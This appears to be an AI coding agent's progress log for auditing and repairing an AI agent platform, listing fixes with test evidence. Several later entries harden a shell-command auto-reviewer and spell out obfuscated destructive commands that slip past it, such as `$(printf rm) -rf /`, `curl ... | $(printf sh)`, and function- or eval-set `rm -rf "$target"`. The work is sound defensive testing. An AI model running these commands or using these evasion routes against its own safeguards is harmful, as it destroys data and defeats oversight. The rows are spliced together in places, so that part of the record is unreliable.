# Agent Audit Repair

Status: verified_branch_pushed_pr_auth_required

## Workflow Routing

- routing: long-goal + specialized multi-agent + noisy-tools verification.
- scope: AI Agent platform code in `ai/agent-*`, `packages/agent-*`, `apps/agent-web`, and `apps/agent-desktop`.
- out_of_scope: Devpilot `server_agent`, task-pull, deployment executor, and existing dirty file `docs/devpilot/external-signoff-pack.md`.
- orchestration_board: `/tmp/codex-tool-runs/svton/long-goals/agent-audit-repair/board.json`

## Acceptance

- Identify all non-Devpilot AI Agent backend/runtime, frontend/UI, SDK/app, desktop/web, persistence, tool, permission, subagent, MCP, memory, and automation paths from source evidence.
- Fix unreasonable design, implementation, flow, and UI issues found during the audit.
- Add or repair focused unit/integration/E2E coverage for changed behavior.
- Verify web and, when feasible, desktop/user flows with screenshots and log evidence.
- Keep noisy logs under `/tmp/codex-tool-runs/svton/`.

Regression first failed in `agent-core-web-search-max-results-validation-order-regression-a199-20260715.log`, then passed after rebuilding the package entrypoint in `agent-core-web-search-max-results-validation-order-rerun-a199-20260715.log` (1/1) and `agent-core-builtins-web-search-rerun-a199-20260715.log` (162/162); broader verification passed in `agent-core-full-test-a199-20260715.log` (1038/1038) and `agent-core-build-a199-20260715.log` (CJS/ESM/DTS success). |
| A200 | done | Core E2E | Preserve explicit `web_search` provider configuration when credentials are missing. | routing: focused slice; no multi-agent needed because the change is confined to the web search executor constructor/config handling and direct validation tests. Explicit `provider: "tavily"` or `provider: "custom"` configs now produce provider-specific missing-credential/endpoint errors instead of being collapsed into the generic unconfigured-search message. Regression first failed in `agent-core-web-search-provider-config-regression-a200-20260715.log`, then passed after rebuilding the package entrypoint in `agent-core-web-search-provider-config-rerun-a200-20260715.log` (3/3) and `agent-core-builtins-web-search-rerun-a200-20260715.log` (162/162); broader verification passed in `agent-core-full-test-a200-20260715.log` (1040/1040) and `agent-core-build-a200-20260715.log` (CJS/ESM/DTS success). |
| A201 | done | Core E2E | Reject `web_search` provider responses that are not valid JSON. | routing: focused slice; no multi-agent needed because the change is confined to web search response parsing and direct validation tests. A successful provider HTTP status is no longer reported as a successful search when `response.json()` fails; the agent gets a clear provider response error instead of `output: null` with empty results. Regression first failed in `agent-core-web-search-invalid-json-regression-a201-20260715.log`, then passed after rebuilding the package entrypoint in `agent-core-web-search-invalid-json-rerun-a201-20260715.log` (4/4) and `agent-core-builtins-web-search-rerun-a201-20260715.log` (162/162); broader verification passed in `agent-core-full-test-a201-20260715.log` (1041/1041) and `agent-core-build-a201-20260715.log` (CJS/ESM/DTS success). |
| A202 | done | Core E2E | Preserve explicit `web_search` provider configs in the executor factory. | routing: focused slice; no multi-agent needed because the change is confined to `createWebSearchExecutor` config preservation and direct validation tests. Explicit provider configs now create a `WebSearchExecutor` even when credentials or endpoints are missing, so execution can return provider-specific configuration errors instead of silently omitting the tool. Regression first failed in `agent-core-web-search-factory-provider-config-regression-a202-20260715.log`, then passed after rebuilding the package entrypoint in `agent-core-web-search-factory-provider-config-rerun-a202-20260715.log` (5/5) and `agent-core-builtins-web-search-rerun-a202-20260715.log` (162/162); broader verification passed in `agent-core-full-test-a202-20260715.log` (1042/1042) and `agent-core-build-a202-20260715.log` (CJS/ESM/DTS success). |
| A203 | done | Core E2E | Reject `image_generate` provider results without usable image data. | routing: focused slice; no multi-agent needed because the change is confined to the image generation tool executor and direct image-gen tests. `image_generate` no longer reports success when a provider returns an empty images array or image entries without `url`/`base64` data. Regression first failed in `agent-core-image-generate-empty-result-regression-a203-20260715.log`, then passed after rebuilding the package entrypoint in `agent-core-image-generate-empty-result-rerun-a203-20260715.log` (29/29); broader verification passed in `agent-core-full-test-a203-20260715.log` (1044/1044) and `agent-core-build-before-image-generate-rerun-a203-20260715.log` (CJS/ESM/DTS success). |
| A204 | done | Core E2E | Normalize `plan_create` title and step fields before plan creation. | routing: focused slice; no multi-agent needed because the change is confined to the planning tool executor and direct planning validation tests. `plan_create` now rejects blank plan titles, blank step titles/descriptions, and blank dependency IDs before creation, while trimming valid title/step/dependency strings before they are persisted into the plan. Regression first failed in `agent-core-plan-create-normalization-regression-a204-20260715.log`, then passed in `agent-core-plan-create-normalization-rerun-after-dependency-a204-20260715.log` (5/5) and `agent-core-builtins-planning-rerun-a204-20260715.log` (162/162); broader verification passed in `agent-core-full-test-after-dependency-a204-20260715.log` (1049/1049) and `agent-core-build-a204-20260715.log` (CJS/ESM/DTS success). The earlier `agent-core-full-test-a204-20260715.log` failed only because it ran concurrently with build while `dist` was being cleaned. |
| A205 | done | Core E2E | Normalize `plan_get_status` and `plan_update_step` identifiers before plan lookup. | routing: focused slice; no multi-agent needed because the change is confined to planning tool parameter normalization and direct planning executor tests. `plan_get_status` and `plan_update_step` now reject blank `planId`/`stepId` before lookup, trim valid IDs before manager calls, trim `status`/`result` before step updates, and expose `in_progress` in the update tool schema to match executor behavior. Regression first failed in `agent-core-plan-id-normalization-regression-a205-20260715.log`, then passed in `agent-core-plan-id-normalization-rerun-after-status-message-a205-20260715.log` (11/11) and `agent-core-builtins-planning-rerun-after-status-message-a205-20260715.log` (162/162); broader verification passed in `agent-core-full-test-a205-20260715.log` (1055/1055) and `agent-core-build-a205-20260715.log` (CJS/ESM/DTS success). |
| A206 | done | Core E2E | Keep permission-denied tool events and model context output consistent. | routing: focused slice; no multi-agent needed because the change is confined to the tool execution pipeline permission-deny branch and direct pipeline tests. Permission-denied tool calls now use the same fallback output for both emitted `tool_call_end` events and the tool result written back into model context, preventing `Permission denied: undefined` from leaking into subsequent model input when a custom permission decision has no reason. Regression first failed in `agent-core-permission-denied-context-regression-a206-20260715.log`, then passed in `agent-core-permission-denied-context-rerun-a206-20260715.log` (19/19); broader verification passed in `agent-core-full-test-a206-20260715.log` (1056/1056) and `agent-core-build-a206-20260715.log` (CJS/ESM/DTS success). |
| A207 | done | Core E2E | Propagate `pre_tool_use` hook modifications into tool execution. | routing: focused slice; no multi-agent needed because the change is confined to tool hook lifecycle handling and direct pipeline tests. `pre_tool_use` hooks that return `modify` with an updated `toolCall` now affect the tool call used for skill gates, permission checks, execution, post hooks, and context updates, while preserving the original call ID for result correlation. Regression first failed in `agent-core-pre-tool-modify-regression-a207-20260715.log`, then passed in `agent-core-pre-tool-modify-rerun-a207-20260715.log` (20/20); broader verification passed in `agent-core-full-test-a207-20260715.log` (1057/1057) and `agent-core-build-a207-20260715.log` (CJS/ESM/DTS success). |
| A208 | done | Core E2E | Normalize malformed executor outputs at the tool registry boundary. | routing: focused slice; no multi-agent needed because the change is confined to `ToolRegistry.execute` result contract enforcement and direct registry tests. `ToolRegistry.execute` now enforces the `ToolResult.output` string contract for custom executor results before they enter the tool execution pipeline, hooks, context storage, or token estimation; malformed `null`/object outputs are stringified while preserving call IDs, errors, and metadata. Regression first failed in `agent-core-tool-registry-output-normalization-regression-a208-20260715.log`, then passed after rebuilding the package entrypoint in `agent-core-tool-registry-output-normalization-rerun-after-build-a208-20260715.log` (30/30); broader verification passed in `agent-core-full-test-a208-20260715.log` (1059/1059) and `agent-core-build-before-tool-registry-rerun-a208-20260715.log` (CJS/ESM/DTS success). |
| A209 | done | Core E2E | Force executor result call IDs to match the requested tool call. | routing: focused slice; no multi-agent needed because the change is confined to `ToolRegistry.execute` result contract enforcement and direct registry tests. `ToolRegistry.execute` now rewrites custom executor result `callId` values to the requested `ToolCall.id`, preventing malformed executors from mis-associating downstream `tool_call_end` events from the originating provider tool call while preserving normalized output text and metadata. Regression first failed in `agent-core-tool-registry-call-id-regression-a209-20260715.log`, then passed after rebuilding the package entrypoint in `agent-core-tool-registry-call-id-rerun-after-build-a209-20260715.log` (31/31); broader verification passed in `agent-core-full-test-a209-20260715.log` (1060/1060) and `agent-core-build-before-call-id-rerun-a209-20260715.log` (CJS/ESM/DTS success). |
| A210 | done | Core E2E | Allow `pre_tool_use` hooks to patch only tool-call fields they need to change. | routing: focused slice; no multi-agent needed because the change is confined to pre-tool hook lifecycle normalization and direct tool execution pipeline tests. `runPreToolUseHook()` now merges partial hook `toolCall` patches onto the original call while preserving the original id, so hooks can update only `arguments` or `name` without repeating the full tool call and invalid non-object arguments cannot overwrite the original arguments. Regression first failed in `agent-core-pre-tool-partial-patch-regression-a210-20260715.log`, then passed in `agent-core-pre-tool-partial-patch-rerun-a210-20260715.log` (21/21); broader verification passed in `agent-core-full-test-a210-20260715.log` (1061/1061) and `agent-core-build-a210-20260715.log` (CJS/ESM/DTS success). |
| A211 | done | Core E2E | Prefer complete `tool_call_end` arguments when streamed delta only produced an empty object. | routing: focused slice; no multi-agent needed because the change is confined to provider tool-call argument parsing and runtime tool-call flow tests. Provider tool-call parsing now treats an empty accumulated `{}` delta as a fallback candidate instead of immediately accepting it, so a later non-empty `tool_call_end.arguments` payload supplies the complete tool arguments for progress events and execution while preserving existing malformed-delta and empty-argument behavior. Regression first failed in `agent-core-runtime-empty-delta-final-args-regression-a211-20260715.log`, then passed in `agent-core-runtime-empty-delta-final-args-rerun-a211-20260715.log` (24/24); broader verification passed in `agent-core-full-test-a211-20260715.log` (1062/1062) and `agent-core-build-a211-20260715.log` (CJS/ESM/DTS success). |
| A212 | done | Core E2E | Preserve final non-object tool-call arguments when streamed delta only produced an empty object. | routing: focused slice; no multi-agent needed because the change is confined to provider tool-call argument parsing and runtime tool-call flow tests. Provider tool-call parsing now only falls back to an empty accumulated `{}` when it is the last defined argument candidate; if a later final `tool_call_end.arguments` payload exists but parses to a non-object value, the runtime preserves it through the existing `{ raw: ... }` fallback for progress events and tool execution. Regression first failed in `agent-core-runtime-empty-delta-final-raw-regression-a212-20260715.log`, then passed in `agent-core-runtime-empty-delta-final-raw-rerun-a212-20260715.log` (25/25); broader verification passed in `agent-core-full-test-a212-20260715.log` (1063/1063) and `agent-core-build-a212-20260715.log` (CJS/ESM/DTS success). |
| A213 | done | Core E2E | Use final `tool_call_end` name when the streamed start name is blank. | routing: focused slice; no multi-agent needed because the change is confined to provider tool-call normalization and runtime tool-call flow tests. Provider tool-call normalization now ignores blank buffered start names and falls back to the final `tool_call_end.name`, preventing streams with late tool names from executing an unknown empty tool while preserving non-blank streamed names. Regression first failed in `agent-core-runtime-blank-start-name-regression-a213-20260715.log`, then passed in `agent-core-runtime-blank-start-name-rerun-a213-20260715.log` (26/26); broader verification passed in `agent-core-full-test-a213-20260715.log` (1064/1064) and `agent-core-build-a213-20260715.log` (CJS/ESM/DTS success). |
| A214 | done | Core E2E | Trim streamed provider tool names before execution. | routing: focused slice; no multi-agent needed because the change is confined to provider tool-call normalization and runtime tool-call flow tests. Provider tool-call normalization now trims buffered and final tool names before execution, so a streamed name such as ` test_tool ` still resolves to the registered tool while blank names continue to fall back to the final name or the unknown-tool error path. Regression first failed in `agent-core-runtime-trim-start-name-regression-a214-20260715.log`, then passed in `agent-core-runtime-trim-start-name-rerun-a214-20260715.log` (27/27); broader verification passed in `agent-core-full-test-a214-20260715.log` (1065/1065) and `agent-core-build-a214-20260715.log` (CJS/ESM/DTS success). |
| A215 | done | Core E2E | Prefer complete final provider tool names over partial streamed start names. | routing: focused slice; no multi-agent needed because the change is confined to provider tool-call normalization and runtime tool-call flow tests. Provider tool-call normalization now treats a non-blank final `tool_call_end.name` as authoritative over the buffered start name, so streams that begin with a partial tool name and finish with the complete name execute the registered tool while final blank names still fall back to the buffered value. Regression first failed in `agent-core-runtime-partial-start-name-regression-a215-20260715.log`, then passed in `agent-core-runtime-partial-start-name-rerun-a215-20260715.log` (28/28); broader verification passed in `agent-core-full-test-a215-20260715.log` (1066/1066) and `agent-core-build-a215-20260715.log` (CJS/ESM/DTS success). |
| A216 | done | Core E2E | Trim streamed provider tool names before emitting UI start events. | routing: focused slice; no multi-agent needed because the change is confined to provider tool-call event normalization and runtime tool-call flow tests. Runtime now trims `tool_call_start.name` before buffering and emitting the UI start event, so UI state uses the same normalized provider tool name that later execution uses. Regression first failed in `agent-core-runtime-start-name-event-regression-a216-20260715.log`, then passed in `agent-core-runtime-start-name-event-rerun-a216-20260715.log` (29/29); broader verification passed in `agent-core-full-test-a216-20260715.log` (1067/1067) and `agent-core-build-a216-20260715.log` (CJS/ESM/DTS success). |

| A218 | done | Client/SDK E2E | Reclassify partial provider tool starts as subagent blocks when progress carries the final subagent tool name. | routing: focused cross-package slice; no multi-agent needed because the change is confined to agent-client and agent-sdk display-state handling for the existing `tool_call_progress.name` event contract. agent-client and agent-sdk now convert a provisional `tool_call` block into a `subagent` block when `tool_call_progress.name` resolves to `subagent_spawn` or `spawn_subagent`, using the progress arguments to recover the task. | A219 | done | Client/SDK E2E | Add slow-tool progress blocks when progress carries the final slow tool name after a partial start. | routing: focused cross-package slice; no multi-agent needed because the change is confined to agent-client and agent-sdk display-state handling for finalized tool names delivered by `tool_call_progress`. agent-client and agent-sdk now add the standard slow-tool progress block when `tool_call_progress.name` resolves a provisional start name such as `web_` to `web_search`, while keeping the updated `tool_call` block in place. | A220 | done | Client/SDK E2E | Preserve existing message block order when progress inserts a slow-tool progress block. | routing: focused cross-package slice; no multi-agent needed because the change is confined to the A219 slow-tool progress insertion helpers in agent-client and agent-sdk. Slow-tool progress insertion now places the progress block immediately before the matching `tool_call` block instead of prepending it ahead of existing text/thinking blocks, preserving the same visual ordering as normal `tool_call_start` slow-tool handling. | A221 | done | Client/SDK E2E | Keep separate slow-tool progress blocks for repeated progress-updated slow tool calls. | routing: focused cross-package slice; no multi-agent needed because the change is confined to the A219/A220 slow-tool progress insertion helpers and display-state tests in agent-client and agent-sdk. | A222 | done | Client/SDK E2E | Mark only the completed slow tool's progress block done when multiple slow tools are running. | routing: focused cross-package slice; no multi-agent needed because the change is confined to agent-client and agent-sdk display-state handling for `tool_call_end` progress block completion. | A254 | done | Core E2E | Resolve dynamic skill context commands through sandbox execution. | routing: focused runtime slice; no multi-agent needed because the change is confined to runtime skill instruction injection and existing skill activation tests. Runtime skill instructions can include dynamic context placeholders like ``!`pwd` ``, and that path previously executed raw `platform.process.exec()` during skill injection. Dynamic context resolution is now extracted to `agent/skill-dynamic-context.utils.ts` and uses the same sandbox profile semantics as tool execution: sandbox exec is preferred when a profile exists, and sandbox-required platforms fail closed instead of falling back to raw process exec. | A386 | done | Core E2E | Reject invalid automation cron schedules instead of creating enabled automations with `nextRunAt=0` that never run. | routing: focused automation schedule-validation slice; no multi-agent needed because the change is confined to automation trigger validation plus create-tool/manager result-contract tests, with noisy verification isolated under `/tmp/codex-tool-runs/svton/`. `AutomationManager.create()` and trigger updates now resolve scheduled `nextRunAt` through `schedule-validation.utils.ts`, rejecting out-of-range cron fields, natural-language times that parse into invalid cron values, and syntactically valid cron expressions with no future run such as `0 0 31 2 *`; event triggers still allow `nextRunAt=0`. Weekly schedules now capture optional `am`/`pm` suffixes and share `normalizeScheduleHour()` with daily schedules, so `weekly on monday at 10pm` maps to `0 22 * * 1` and `weekly on monday at 12am` maps to `0 0 * * 1`. | A390 | done | Core E2E | Preserve automation pause/delete state changes made during `runNow()` handlers so completed runs cannot reschedule or repersist stale enabled definitions. | routing: focused automation lifecycle slice; no multi-agent needed because the change is confined to `AutomationManager.runNow()` post-handler reschedule semantics plus a small lifecycle regression test, with noisy verification isolated under `/tmp/codex-tool-runs/svton/`. `AutomationManager.runNow()` now records run history, then reloads the current definition from the manager map before updating `lastRunAt`, persisting, or rescheduling; definitions deleted during the handler are left deleted, and definitions paused during the handler stay disabled without an extra schedule. | A459 | done | Core E2E | Deny dangerous command targets when command substitution produces a literal executable name, such as `$(printf rm) -rf /` or `curl ... \| $(printf sh)`. | routing: focused auto-reviewer safety slice; no multi-agent needed because the change is confined to command-substitution executable resolution plus direct auto-reviewer regression tests, with noisy verification isolated under `/tmp/codex-tool-runs/svton/agent-audit-repair/`. The merge helper is shared by `rm-command.utils.ts` and `remote-shell-pipe.utils.ts`, keeping source responsibilities separated and all source files below 200 lines. | A613 | done | Core E2E | Apply shell function static assignment side effects before later commands, so `f(){ target=/; }; f; rm -rf "$target"`, function-set find-delete, and function-set remote fetch deny, while `local` assignments do not leak and function `unset` clears stale static state. | evidence: shell semantics log `bash-function-static-assignment-side-effect-a613-20260718.log` showed ordinary function assignments set caller variables, function `local` stays unset outside the function, and function `unset` clears the caller variable; red log `agent-core-function-static-assignment-red-a613-20260718.log` reproduced both false negatives for function-set rm/find/remote and a false positive where `target=/; f(){ unset target; }; f; rm -rf "$target"` still denied. `shell-static-assignment-command.utils.ts` now records shell function definitions while building static-assignment variants and delegates invocation side effects to new `shell-static-function-assignment.utils.ts`; function-side state uses a scoped local-name set so `local` / non-`-g` `declare` / non-`-g` `typeset` do not leak back to the caller, while ordinary assignment, read, printf, eval, and unset side effects do. Focused logs `agent-core-function-static-assignment-focused-a613-20260718.log` and `agent-core-function-static-assignment-focused2-a613-20260718.log` passed 1 file / 2 tests; related log `agent-core-function-static-assignment-related-a613-20260718.log` passed 10 files / 111 tests; auto-reviewer suite log `agent-core-auto-reviewer-suite-a613-20260718.log` passed 83 files / 285 tests; build log `agent-core-build-a613-20260718.log` passed CJS/ESM/DTS; full `@svton/agent-core` log `agent-core-full-test-a613-20260718.log` passed 181 files / 1575 tests. | A614 | done | Core E2E | Apply brace-group static assignment side effects before later commands, so `{ target=/; }; rm -rf "$target"`, brace-set find-delete, and brace-set remote fetch deny, while brace `unset` clears stale static state and subshell `( target=/ )` remains non-leaking/user-reviewable. | evidence: shell semantics log `bash-brace-group-static-assignment-side-effect-a614-20260718.log` showed brace groups set caller variables, brace unset clears them, and subshell assignment does not leak; red log `agent-core-brace-group-static-assignment-red-a614-20260718.log` reproduced both false negatives for brace-set rm/find/remote and a false positive where `target=/; { unset target; }; rm -rf "$target"` still denied. New `shell-static-group-assignment.utils.ts` conservatively applies static state only for explicit `{ ...; }` brace bodies and does not unwrap `( ... )` subshell groups. | A615 | done | Core E2E | Apply Bash `for ... in ...; do ...; done` static assignment side effects before later commands, so later `rm`, `find -delete`, and remote-fetch pipelines see the loop variable's final static value, while dynamic loop values clear stale state and empty loops preserve Bash semantics. | evidence: shell semantics log `bash-for-loop-variable-side-effect-a615-20260718.log` showed a non-empty `for` leaves the loop variable at its last value, empty `for ... in` preserves any previous value, and `fetch=curl` loop variables expand after the loop; red log `agent-core-for-loop-static-assignment-red-a615-20260718.log` reproduced false negatives for loop-set rm/find/remote and a false positive where `target=/; for target in "$OTHER"; do :; done; rm -rf "$target"` still denied. `splitShellCommandListSegments()` now keeps `for/select/while/until ... do ... done` bodies together for statement-level state tracking, `shell-for-loop-parser.utils.ts` centralizes static `for` parsing, and `shell-static-for-loop-assignment.utils.ts` applies final loop variables plus body side effects while clearing stale state for dynamic loop values. Focused log `agent-core-for-loop-static-assignment-focused-a615-20260718.log` passed 1 file / 3 tests; related log `agent-core-for-loop-static-assignment-related-a615-20260718.log` passed 7 files / 105 tests; auto-reviewer suite log `agent-core-auto-reviewer-suite-a615-20260718.log` passed 86 files / 307 tests; build log `agent-core-build-a615-20260718.log` passed CJS/ESM/DTS; full `@svton/agent-core` log `agent-core-full-test-a615-20260718.log` passed 183 files / 1580 tests. | A616 | done | Core E2E | Apply static shell `case ... in ... esac` branch assignment side effects before later commands, so known matching branches can set variables used by later `rm`, `find -delete`, and remote-fetch pipelines while preserving user-reviewable behavior for unmatched or dynamic subjects. | evidence: shell semantics log `bash-case-static-assignment-side-effect-a616-20260718.log` showed matching case branches set later variables, non-matching branches preserve previous values, remote-fetch command variables persist after case, and branch statement order matters. Red log `agent-core-case-static-assignment-red-a616-20260718.log` reproduced false negatives for case-set rm/find/remote and a stale-state false positive where a known safe branch should overwrite `target=/`. `splitShellCommandListSegments()` now keeps `case ... in ... esac` bodies together, including quoted subjects; new `shell-case-parser.utils.ts` parses case subjects and branches with exact, `|`, `*`, and `?` static pattern support; `shell-static-case-assignment.utils.ts` applies only statically matched branch side effects; `shell-case-command.utils.ts` now uses the parser before its legacy branch-fragment fallback so existing case-branch dangerous-command scanning still works. | A617 | done | Core E2E | Apply static shell `if ...; then ...; else ...; fi` assignment side effects before later commands for statically known true/false conditions, while leaving dynamic conditions user-reviewable. | evidence: shell semantics log `bash-if-static-assignment-side-effect-a617-20260718.log` showed `if true` branch assignments persist after `fi`, `if false ... else` uses the else assignment, true branches can overwrite stale dangerous values, false no-else preserves previous state, and remote-fetch command variables persist after `fi`. Red log `agent-core-if-static-assignment-red-a617-20260718.log` reproduced false negatives for if-set rm/find/remote and a stale-state false positive where a known true branch should overwrite `target=/` with `/tmp/project`. New `shell-static-assignment-statement.utils.ts` groups `if...fi` fragments only for static-assignment analysis without changing global shell splitting; `shell-if-parser.utils.ts` parses simple if/then/else/fi statements and statically evaluates `true`, `:`, `false`, `test`, and `[ ... ]` equality/nonempty checks; `shell-static-if-assignment.utils.ts` applies only statically selected branch side effects. To keep source structure healthy, same-shell eval state moved from `shell-static-assignment-command.utils.ts` into `shell-static-eval-assignment.utils.ts`, dropping the main state machine to 180 lines. | A618 | done | Core E2E | Respect Bash `&&` / `||` short-circuit semantics when applying static assignment side effects before later commands, so skipped branches do not set or clear variables and executed branches still influence later `rm`, `find -delete`, and remote-fetch pipelines. | evidence: shell semantics log `bash-logical-static-assignment-side-effect-a618-20260718.log` showed `false && target=/` and `true || target=/` do not assign, while `true && target=/` and `false || target=/` do; it also showed skipped branches preserve stale state and executed branches overwrite it. Red log `agent-core-logical-static-assignment-red-a618-20260718.log` reproduced false positives where skipped root assignments denied, plus false negatives where skipped safe overwrites hid a stale root assignment. `splitShellCommandListSegmentItems()` now preserves command-list separator metadata while keeping the legacy string splitter API intact; `splitStaticAssignmentCommandStatements()` carries the previous operator through grouped statements; `shell-static-command-status.utils.ts` statically recognizes simple successful assignments/declarations, `true`, `:`, `false`, `test`, and `[ ... ]`; `staticAssignmentCommandStrings()` now skips static state updates for short-circuited `&&` / `||` branches and preserves previous state for dynamic conditions. | A619 | done | Core E2E | Respect Bash leading `!` command negation when deriving static `&&` / `||` short-circuit status, so negated true/false conditions execute or skip later static assignments correctly. | evidence: shell semantics log `bash-logical-negation-static-assignment-a619-20260718.log` showed `! false && target=/` and `! true || target=/` execute RHS assignments, while `! true && target=/` and `! false || target=/` skip them; it also showed executed negated branches overwrite stale state. Red log `agent-core-logical-negation-red-a619-20260718.log` reproduced false negatives for `! false && target=/; rm -rf "$target"` and `! true || target=/; find "$target" -delete`. `shell-static-command-status.utils.ts` now handles one or more leading `!` tokens by negating a known static command status while preserving unknown for dynamic commands. | A620 | done | Core E2E | Derive static exit status for complete Bash `if ...; then ...; else ...; fi` compound commands before applying `&&` / `||` assignment side effects, so later dangerous commands see assignments gated by the selected branch status. | evidence: shell semantics log `bash-if-command-status-a620-20260718.log` showed selected branch command status controls following `&&` / `||` assignments, and that `if false; then ...; fi` without an executed branch still exits success so `||` is skipped. Red log `agent-core-if-command-status-red-a620-20260718.log` reproduced the false negative where `if true; then true; else false; fi && target=/; rm -rf "$target"` stayed `ask_user`. `shell-static-command-status.utils.ts` now recognizes complete `if` statements, statically selects the known branch via `shellIfStatement()` / `staticShellIfConditionResult()`, derives the selected body command-list status with short-circuit-aware `&&` / `||` handling, and treats an empty selected body as Bash success. New `shell-static-errexit-suppression.utils.ts` centralizes temporary suppression; `staticAssignmentCommandStrings()` now applies side effects and reads command status with suppression when the current statement is followed by `&&` / `||`; `applyStaticIfState()` now applies condition side effects and reads condition status under suppression before deciding then/else. | A641 | done | Core E2E | Resolve shell function calls in `if` conditions under `errexit` ignored context, so condition function side effects leak like Bash and can drive then/else static assignment propagation. | evidence: Bash semantics log `bash-errexit-if-function-condition-a641-20260718.log` confirmed `set -e; f(){ false; target=/; }; if f; then ... fi` runs the function body with `errexit` suppressed, leaks `target=/`, and executes the then branch because the final assignment succeeds; the same log confirmed tested top-level function calls through `f && true` and `f || false` leak side effects. Probe log `agent-core-errexit-if-function-condition-probe-a641-20260718.log` against the pre-A641 built dist reproduced the false negative where `if f` stayed `ask_user` while `f && true` was already covered. New `auto-reviewer-errexit-if-function-condition.test.ts` covers function conditions leaking side effects, then-branch overwrite after function condition status, and tested top-level function call regression. `applyStaticIfState()` now accepts the active shell function registry, applies function condition side effects under `errexit` suppression, and derives function condition status with `staticShellFunctionCommandStatus()` before applying then/else bodies. `staticAssignmentCommandStrings()` now passes the active registry through `applyStaticVariableState()`; assignment-state writes moved to `shell-static-assignment-state.utils.ts`, and negated suppressed application moved to `shell-static-negated-assignment.utils.ts` to keep `shell-static-assignment-command.utils.ts` at 194 lines. | A644 | done | Core E2E | Apply static side effects and success status for zero-iteration `while` / `until` loops, so loop conditions that run once before a skipped body still influence later dangerous commands and `&&` short-circuit assignments. | evidence: Bash semantics log `bash-while-until-zero-iteration-a644-20260718.log` confirmed `while target=/; false` and `until target=/; true` leak condition assignments, skip body overwrites, and exit successfully for following `&&`. Red log `agent-core-while-until-zero-iteration-red-a644-20260718.log` reproduced the false negative where zero-iteration loop condition assignments stayed `ask_user`; the new focused test also covers safe condition overwrites and loop-success `&&` assignments. New `shell-while-until-loop-parser.utils.ts`, `shell-static-while-until-assignment.utils.ts`, and `shell-static-while-until-status.utils.ts` model only statically proven zero-iteration loops; `applyStaticCommandListState()` now returns final static status, `shell-static-assignment-state.utils.ts` can clone/commit state, and `shell-static-control-statement.utils.ts` keeps the main assignment entrypoint below the source line ceiling. | A645 | done | Core E2E | Stop applying unreachable static side effects after `break` / `continue` inside statically expanded `for` loop bodies, so skipped assignments cannot create false positives or hide dangerous values. | evidence: Bash semantics log `bash-loop-break-continue-static-assignment-a645-20260718.log` confirmed assignments after `break` or `continue` are skipped, assignments before `break` still leak from the loop body, and loops ending through `break` / `continue` still succeed for following `&&` assignments. New `auto-reviewer-for-loop-break-continue-static-assignment.test.ts` covers unreachable side effects after `break` / `continue`, preserved assignments before `break`, and loop-success `&&` assignments. New `shell-static-loop-command-list-assignment.utils.ts` applies loop bodies with a `break` / `continue` control signal while reusing existing `&&` / `||` and `errexit` result helpers; `applyStaticForLoopState()` now stops remaining body statements after `continue` and stops later iterations after `break`. New `auto-reviewer-while-until-break-static-assignment.test.ts` covers assignments before `break`, ignored assignments after `break`, condition side effects before an entered loop body, and break-loop success status for following `&&` assignments. `applyStaticWhileUntilState()` now handles both zero-iteration loops and statically entered break loops by applying the condition in an `errexit`-suppressed clone, then committing side effects only when the body reaches `break`; `staticShellWhileUntilLoopStatus()` mirrors that status inference for `&&` / `||` decisions; `shell-loop-control-command.utils.ts` centralizes static `break` / `continue` recognition shared with the loop body helper. Regression first failed in `agent-core-allexport-explicit-unexport-assignment-red-a674-20260718.log`, then passed in `agent-core-allexport-explicit-unexport-assignment-focused-a674-20260718.log` (1 file / 9 tests), `agent-core-allexport-explicit-unexport-assignment-related-a674-20260718.log` (7 files / 34 tests), `agent-core-auto-reviewer-suite-a674-20260718.log` (134 files / 418 tests), `agent-core-build-a674-20260718.log` (CJS/ESM/DTS success), `agent-core-full-test-a674-20260718.log` (231 files / 1691 tests), and `agent-core-allexport-explicit-unexport-assignment-probe-after-a674-20260718.log` (`declare +x` assignment under allexport denies root while `export -n` assignment and later unexports remain ask_user). |
| A675 | done | Core E2E | Preserve exported parent variables when a child shell command also has unrelated env prefixes, while respecting same-name prefix overrides and `env -i` / `env -u` environment clearing. | routing: focused slice with noisy-tools verification plus read-only scout; no write subagent because the risk is confined to `ai/agent-core` shell launcher/static exported env propagation. Bash semantics logs `bash-exported-parent-with-env-prefix-a675-20260718.log` and `bash-env-prefix-before-env-a675-20260718.log` confirmed exported `target=/` still reaches `other=1 bash -c`, `env other=1 bash -c`, and `target=/ env bash -c`; same-name `target=/tmp/project` overrides it; `env -i` and `env -u target` clear it. Analyzer probes `agent-core-exported-parent-with-env-prefix-probe-a675-20260718.log` and `agent-core-env-prefix-before-env-probe-a675-20260718.log` showed false negatives for unrelated-prefix/env-wrapped root child-shell cases. Regression first failed in `agent-core-exported-parent-with-env-prefix-red-a675-20260718.log`, then passed in `agent-core-exported-parent-with-env-prefix-focused-a675-20260718.log` (1 file / 11 tests), `agent-core-exported-parent-with-env-prefix-related-a675-20260718.log` (8 files / 81 tests), `agent-core-auto-reviewer-suite-a675-20260718.log` (134 files / 420 tests), `agent-core-build-a675-20260718.log` (CJS/ESM/DTS success), `agent-core-full-test-a675-20260718.log` (231 files / 1693 tests), and `agent-core-exported-parent-with-env-prefix-probe-after-a675-20260718.log` (unrelated prefixes now deny while same-name override, `env -i`, and `env -u target` remain ask_user). |
| A676 | done | Core E2E | Detect dangerous root targets passed into `eval` through shell assignment prefixes, while restoring prefix variable names after eval as Bash does. | routing: read-only scout found the candidate, main thread owns the focused fix; no write subagent because the risk is confined to `ai/agent-core` eval command-string and static eval state handling. Bash evidence logs `bash-eval-prefix-danger-targets.log`, `bash-eval-prefix-state-a676-20260718.log`, `bash-eval-prefix-body-assignment-scope-a676-20260718.log`, and `bash-eval-prefix-restore-names-a676-20260718.log` confirmed prefix variables are visible inside eval, prefix variable names are restored after eval, and non-prefix eval body assignments can persist. After structure split, final reruns passed in `agent-core-a675-a676-focused-after-structure-20260718.log` (2 files / 14 tests), `agent-core-a675-a676-related-after-structure-20260718.log` (12 files / 90 tests), `agent-core-auto-reviewer-suite-a676-final-20260718.log` (134 files / 421 tests), `agent-core-build-a676-final-20260718.log` (CJS/ESM/DTS success), `agent-core-full-test-a676-final-20260718.log` (231 files / 1694 tests), and `agent-core-a675-a676-probe-after-structure-20260718.log` (A675/A676 dist boundaries remain aligned). |

